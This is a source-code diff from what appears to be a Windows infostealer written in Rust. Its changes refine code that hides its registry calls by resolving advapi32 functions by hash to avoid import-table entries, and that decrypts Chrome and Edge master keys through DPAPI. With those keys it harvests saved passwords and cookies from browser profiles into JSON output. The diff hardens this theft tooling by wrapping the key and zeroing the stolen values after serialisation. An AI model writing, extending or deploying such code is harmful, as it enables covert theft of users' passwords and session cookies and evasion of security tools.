@@ -106,7 +106,11 @@ unsafe fn resolve_api_or_load<T>(
 }
 // ── Registry helpers via pe_resolve (no IAT entries) ───────────────────────
 //
-// advapi32.dll registry functions resolved at runtime to avoid IAT entries.
+// P2-35: advapi32.dll registry functions resolved at runtime via pe_resolve
+// to avoid static IAT entries.  The `winreg` crate is NOT used — all registry
+// access (RegOpenKeyExW, RegQueryValueExW, RegCloseKey) is resolved dynamically
+// from advapi32.dll by hash, with advapi32.dll itself loaded by hash from the
+// PEB (no static import).
 
 type FnRegOpenKeyExW = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *mut *mut c_void) -> i32;
 type FnRegQueryValueExW = unsafe extern "system" fn(*mut c_void, *const u16, *mut u32, *mut u8, *mut u8, *mut u32) -> i32;
@@ -642,7 +646,7 @@ fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>> {
 ///
 /// For `v20` cookies, the entire value (after stripping `v20`) is DPAPI-
 /// wrapped; decrypt with DPAPI first, then apply AES-256-GCM.
-fn decrypt_chromium_value(master_key: &[u8], data: &[u8]) -> Result<Vec<u8>> {
+fn decrypt_chromium_value(master_key: &common::SecureKey, data: &[u8]) -> Result<Vec<u8>> {
     if data.len() < 3 {
         bail!("encrypted value too short");
     }
@@ -656,11 +660,11 @@ fn decrypt_chromium_value(master_key: &[u8], data: &[u8]) -> Result<Vec<u8>> {
         if inner.len() < 3 || &inner[..3] != b"v10" {
             bail!("v20 DPAPI payload did not start with v10");
         }
-        return aes256gcm_decrypt(master_key, &inner);
+        return aes256gcm_decrypt(master_key.as_bytes(), &inner);
     }
 
     if prefix == b"v10" || prefix == b"v11" {
-        return aes256gcm_decrypt(master_key, data);
+        return aes256gcm_decrypt(master_key.as_bytes(), data);
     }
 
     // Legacy: DPAPI-only (Chrome < v80).
@@ -1666,7 +1670,7 @@ fn find_chromium_profiles(user_data_dir: &Path) -> Vec<PathBuf> {
 /// Read and decrypt Login Data for one Chromium profile.
 fn collect_chromium_credentials(
     profile_dir: &Path,
-    master_key: &[u8],
+    master_key: &common::SecureKey,
     browser: &str,
 ) -> Vec<CredentialRecord> {
     let db_path = profile_dir.join("Login Data");
@@ -1727,7 +1731,7 @@ fn collect_chromium_credentials(
 /// Read and decrypt Cookies for one Chromium profile.
 fn collect_chromium_cookies(
     profile_dir: &Path,
-    master_key: &[u8],
+    master_key: &common::SecureKey,
     browser: &str,
 ) -> Vec<CookieRecord> {
     // Chrome 96+: cookies DB is at Network/Cookies; older versions at Cookies.
@@ -1843,7 +1847,7 @@ pub fn collect_chrome_data(
 
     let local_state = user_data_dir.join("Local State");
     let master_key = match get_chromium_master_key(&local_state, CHROME_ELEVATION_CLSIDS) {
-        Ok(k) => k,
+        Ok(k) => common::SecureKey::from_vec(k),
         Err(_) => return result,
     };
 
@@ -1880,7 +1884,7 @@ pub fn collect_edge_data(data_type: &common::BrowserDataType) -> BrowserDataResu
 
     let local_state = user_data_dir.join("Local State");
     let master_key = match get_chromium_master_key(&local_state, EDGE_ELEVATION_CLSIDS) {
-        Ok(k) => k,
+        Ok(k) => common::SecureKey::from_vec(k),
         Err(_) => return result,
     };
 
@@ -2370,7 +2374,20 @@ pub fn collect_browser_data(
         result.cookies.extend(partial.cookies);
     }
 
-    serde_json::to_string(&result).context("serializing BrowserDataResult")
+    let json = serde_json::to_string(&result).context("serializing BrowserDataResult")?;
+
+    // P3-16: Zeroize sensitive credential values now that they've been
+    // serialized.  The JSON string is returned to the caller; the
+    // intermediate BrowserDataResult structs are cleared so that
+    // password / cookie-value bytes don't linger on the heap.
+    for cred in &mut result.credentials {
+        common::secure_zero_string(&mut cred.password);
+    }
+    for cookie in &mut result.cookies {
+        common::secure_zero_string(&mut cookie.value);
+    }
+
+    Ok(json)
 }
 
 // ── Tests ──────────────────────────────────────────────────────────────────────
